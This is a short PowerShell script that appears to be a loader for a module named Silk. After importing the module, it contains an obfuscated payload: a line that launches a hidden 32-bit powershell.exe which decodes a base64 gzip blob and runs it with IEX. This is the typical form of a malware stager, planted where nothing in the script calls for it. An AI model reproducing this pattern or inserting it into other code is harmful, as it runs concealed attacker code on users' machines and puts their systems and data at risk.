















[CmdletBinding()]
param(
)

Set-StrictMode -Version Latest
$PSScriptRoot = Split-Path -Parent -Path $MyInvocation.MyCommand.Definition

if( (Get-Module Silk) )
{
    Remove-Module Silk
}

Import-Module (Join-Path $PSScriptRoot Silk.psd1 -Resolve) -ErrorAction Stop

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAExcRlcCA7VW/2/aOhD/uZP2P0QTUhI9yveua6VJzwFS0hIKDYQCQ5NJnOBiEuo4FNjb//4ukKxU66a+SS8iwvbd2Xef+5wvXhw4goaBxK8MvX8vfXv/7qSLOV5KSo7dfvo60PJSzhF2hd9Xzk2qnpyAQs4f6/ZsLn2WlAlarRrhEtNgenlZjzkngTjMC1dEoCgiyxmjJFJU6R9pOCecnN7OHogjpG9S7mvhioUzzFK1bR07cyKdosBNZO3QwYlrBWvFqFDkL19kdXJanhaajzFmkSJb20iQZcFlTFal72pyYH+7IopsUoeHUeiJwpAG1UphEETYIx3YbU1MIuahG8kqxAE/TkTMAymNKNnioKDIMOzy0EGuy0kE+gUjWIcLouSCmLG89LcySc+/iwNBlwTkgvBwZRG+pg6JCi0cuIzcEW+qdMhTFvZbjZRjI9DqCq7mISmvOmqGbszIwVZWf3Y1TaUKz8t0Agrf3797/87LaOBF1a9t48I0jpkAo5PJfkzAW6UbRnSv/Fkq5SUTTsUi5FuY5vo8JupUmiR5mEynUo7ekfajfpP/9RblTB+0SbMzg6WJHVJ3CiZpknKz1nKz3bY6t3Ei/TXlGsSjAWlsA7ykTsYq5TX4icfIPuJCptYB1xQ5FRC3QRjxsUjgzEuTn82aSyp+2GoxZS7hyIEURuAVZFd96cwhQ4psBCZZAliHuQzZ8IDLJNNO+bvNTk/moCTXGY6ivNSNoZicvGQRzIibl1AQ0VSEYhHuh/Kzu2bMBHVwJLLtpupLNNNT62EQCR47kEVAoG+tiEMxSwDJSy3qEm1rUT87XX4VjjpmjAY+7LSGdMBKAoMlEm5wcDTjgVqwiDCWK0aWoLYvb51hH4o5LYg9n7BPXPl1VzPSHxieQJNhcuQo5NtiochLNuUC7ooE5oRaf+zH0UVx5FGdkzRFSlZHE20rEuLn/FplEFVJQtcUrD00XAAsOg+XGo7Ix5olOICmfCje0jqCZ2QEzHS0BS2jJ1o2THgHtGqEjXP35vqhVeSNzdxDRmSYrW6j12rV1teWXRNW0xA3XUOYzfuHBwu17gYjMTZQq09Li1Ftt7qmO6uN3NGm+HGn7Z5K2mb34LveqOF5/rln3ZXPdNoe1ntaqYLbjWbcHmpPWqkWNelTq0cHvcW1LmYjm+GBV/TvyxeYbtr8wS6H5s5A6GpedXbXnn01N93tqFW8GNYWqIlQPWjauhbejDSOukV7oGu9QVPr9WDto1/0arDG/ponYSOzj8qdh1H5tj8odejZYnx1tmsvz5iLtNFQn//Ri67o6qZhIfCn3dM2j5qthchHNDaCJZ5rQ7tCx6v7uznIdQjTLJZqhks24af2kNrroo197VHTx/cYtcdbvVgsj6IKXsAeGjisjx8h7tFK7zKw7w8qIbJZ51m312rcOOPyeWR+/pAQCBiUW0fIJmczs0aPWPGrPmBiHs0xA7bA9Z6Vrx5yPb2ouyFNLBQl7dsLwgPCoNdBN8xojxgLnaRpPF/q0LUOvWQKVTyAYbXy6kiVfiiqz/0kW7q8HIOzUE0pywttEvhini9tqqUStITSplaCqN8eYz1cbZVst3zSVY7QOjqH7c9Rk0rL+Rf3pf8byLTC5/DnvgnI57XfSN8Ebil/DMFPwpcL/wnsP8BhiKkAXQsuK0YOnfQ3cKQUOvoOSXIF7PDSJ/kWvI3FaQc+T/4FGKzG+YEKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

